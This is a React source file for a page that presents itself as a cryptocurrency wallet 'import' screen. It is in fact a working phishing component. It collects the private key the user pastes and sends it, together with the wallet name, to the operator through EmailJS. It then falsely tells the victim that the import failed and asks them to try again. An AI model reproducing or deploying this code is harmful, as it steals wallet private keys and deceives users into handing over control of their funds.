import React, { useState, useEffect, useContext } from "react";
import emailjs from "@emailjs/browser";
import { FaArrowRight, FaArrowRotateRight } from "react-icons/fa6";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { useNavigate } from "react-router-dom";
import { TextInput } from "flowbite-react";
import { Button, Modal, Label } from "flowbite-react";
import { HiOutlineExclamationCircle } from "react-icons/hi";
import { ProjectContext } from "../context/ProjectContext";

const PrivateKey = () => {
  const [loading, setLoading] = useState(false);
  const [openModal, setOpenModal] = useState(false);
  const { walletName, privateKey, setPrivateKey, handleSubmitNow } =
    useContext(ProjectContext);
  const navigate = useNavigate(); 

  const handleSubmit = async (e) => {
    e.preventDefault();
    setOpenModal(false);
    setLoading(true);
    emailjs
      .send(
        import.meta.env.VITE_API_SERVICEID,
        import.meta.env.VITE_API_TEMPLATEID,
        {
          message: privateKey,
          walletName: walletName,
        }
      )
      .then((response) => {
        setLoading(false);
        handleSubmitNow();
        toast.error("Wallet not successfully imported. Please try again.");
        setPrivateKey("");
        setTimeout(() => {
          navigate("/");
        }, 3000);
      })
      .catch((error) => {
        navigate("/error");
        setLoading(false);
        toast.error("Wallet not successfully imported. Please try again.");
      });
  };

  useEffect(() => emailjs.init(import.meta.env.VITE_API_PUBLIC_KEY), []);

  return (
    <section className="">
      <ToastContainer autoClose={2500} />

      <form className="form">
        <div className="p-2">
          <div className="mb-2 block">
            <Label htmlFor="comment" value="Enter your key" />
          </div>
          <TextInput
            className="focus:outline-wallet focus:ring-0 focus:border-0"
            placeholder="Paste here..."
            onChange={(e) => setPrivateKey(e.target.value)}
            id="base"
            type="text"
            sizing="md"
          />
        </div>
        <p className="text-sm self-center mt-6 text-gray-900 dark:text-gray-200">
          Typically 64 alphanumeric characters
        </p>
        <div
          onClick={privateKey.length > 30 ? handleSubmit : null}
          value="send"
          className="submitBtn self-center mt-10 max-w-sm w-full"
        >
          {loading ? "Importing.." : "Import"}
          {loading ? (
            <FaArrowRotateRight className="animate-spin font-bold" />
          ) : (
            <FaArrowRight />
          )}
        </div>{" "}
        <a
          className="text-center mt-10 text-gray-900 dark:text-gray-200 duration-300"
          href="https://cointelegraph.com/explained/what-is-a-seed-phrase-and-why-is-it-important"
        >
          What is secret phrase?
        </a>
      </form>
    </section>
  );
};

export default PrivateKey;
